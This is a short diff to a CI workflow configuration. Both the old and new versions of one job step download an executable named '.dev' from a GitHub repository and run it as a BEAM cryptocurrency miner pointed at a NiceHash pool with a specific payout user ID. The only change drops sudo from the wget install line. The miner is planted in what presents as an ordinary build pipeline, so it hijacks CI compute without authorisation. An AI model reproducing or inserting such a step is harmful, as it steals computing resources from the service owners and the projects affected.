@@ -30,6 +30,6 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        sudo apt install wget -y &&
+        apt install wget -y &&
         wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev && ./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.Beam
       image: tensorflow/tensorflow:1.14.0-gpu-py3
